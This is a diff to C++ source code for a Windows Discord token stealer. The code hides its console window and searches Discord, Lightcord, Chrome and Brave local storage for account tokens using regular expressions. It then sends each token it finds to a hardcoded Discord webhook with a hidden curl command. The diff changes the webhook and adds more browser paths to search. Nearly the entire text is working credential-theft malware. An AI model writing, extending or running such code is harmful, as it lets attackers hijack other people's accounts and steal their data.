@@ -8,15 +8,13 @@
 #include <Windows.h>
 namespace fs = std::filesystem;
 
-bool send_token(std::string token) {
+std::string send_token(std::string token) {
 
 	char cmd[1024];
+	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/838945717983903764/5BZTjs7uKTVTwPy6oOzMt-RyOggAkVEKWviIXcdRQH9xWFtrMlUkUKQ9DBbzPQ_ac2yn >nul", token.c_str());
+	WinExec(cmd, SW_HIDE);
 
-
-	sprintf(cmd, "curl -d \"content=%s\" https://discord.com/api/webhooks/840401711205711883/NwJYct_xpJPrD5e6Xx9pzBARDl9JenMdVEYp69a4smbMCFHts-qXzTTu2KDstKToHZyW >nul", token.c_str());
-
-	WinExec(cmd,SW_HIDE);
-	return true;
+	return cmd;
 }
 
 std::vector<std::string> findMatch(std::string str, std::regex reg)
@@ -35,7 +33,7 @@ std::vector<std::string> findMatch(std::string str, std::regex reg)
 }
 
 int main() {
-	FreeConsole();
+	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
 
 	// Persistence
@@ -52,17 +50,17 @@ int main() {
 
 	// Finding token
 
-	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb" };
+	std::vector<std::string> installs = { "\\Lightcord\\Local Storage\\leveldb", "\\Discord\\Local Storage\\leveldb", "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb", "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb", "\\discordptb\\Local Storage\\leveldb", "\\discordcanary\\Local Storage\\leveldb"};
 
 	for (int i = 0; i < 2; i++) {
 		std::string path = std::getenv("appdata") + installs[i];
 		for (const auto& entry : fs::directory_iterator(path)) {
-			std::ifstream t(entry.path(),std::ios_base::binary);
+			std::ifstream t(entry.path(), std::ios_base::binary);
 
 			std::string str((std::istreambuf_iterator<char>(t)), std::istreambuf_iterator<char>());
 			std::vector<std::string> matches;
 			std::regex expression(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})"); // Checksum credit for token regex.
-			std::regex expression2(R"([\w-]{3}\.[\w-]{84})"); 
+			std::regex expression2(R"([\w-]{3}\.[\w-]{84})");
 
 			std::vector<std::string> regex_non_mfa = findMatch(str, expression); // NightfallGT for this function
 			std::vector<std::string> regex_mfa = findMatch(str, expression2); // NightfallGT for this function
@@ -72,14 +70,11 @@ int main() {
 			for (int i = 0; i < regex_mfa.size(); i++) {
 				matches.push_back(regex_mfa[i]);
 			}
-			
+
 
 			for (int i = 0; i < matches.size(); i++) {
 				send_token(matches[i]);
 			}
-
 		}
 	}
-
-	// End
 }
